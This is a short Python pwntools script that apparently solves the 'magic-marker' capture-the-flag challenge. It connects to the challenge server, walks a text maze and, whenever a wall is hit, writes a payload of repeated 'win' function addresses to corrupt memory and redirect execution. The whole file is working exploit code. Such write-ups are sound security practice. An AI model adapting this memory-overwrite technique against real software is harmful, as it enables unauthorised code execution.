from pwn import *

#r = process("./magic-marker")
#gdb.attach(r)

r = remote("chals.damctf.xyz", 31313)

r.recvuntil(b'What would you like to do?')
r.sendline(b"jump up and down")

r.recvuntil(b'm - show map, q - give up):')


def go_north():
	r.sendline(b'w')
	return r.recvuntil(b'm - show map, q - give up):')

def go_west():
	r.sendline(b'a')
	return r.recvuntil(b'm - show map, q - give up):')

def go_south():
	r.sendline(b's')
	return r.recvuntil(b'm - show map, q - give up):')

def go_east():
	r.sendline(b'd')
	return r.recvuntil(b'm - show map, q - give up):')

def writing(payload):
	r.sendline(b'x')
	r.recvuntil(b'write?')
	r.send(payload)
	return r.recvuntil(b'm - show map, q - give up):')

def show_map():
	r.sendline(b'm')
	return r.recvuntil(b'm - show map, q - give up):')

win = 0x400fa0

count = 0
while(1):
#for i in range(40):
	#print("i: " + str(i))
	stuff = go_south() 
	print(stuff)
	if(b'=' in stuff):
		break
	if(b"There's a wall there." in stuff):
		print("count: " + str(count))
		count += 1
		x = 0x0200000000
		#x = 0xffffffffffffffff
		payload = p64(win) + p64(win) + p64(win) + p64(x)
		#payload = "123"
		writing(payload)


r.sendline(b'q')
print(r.recvall())

#r.interactive()



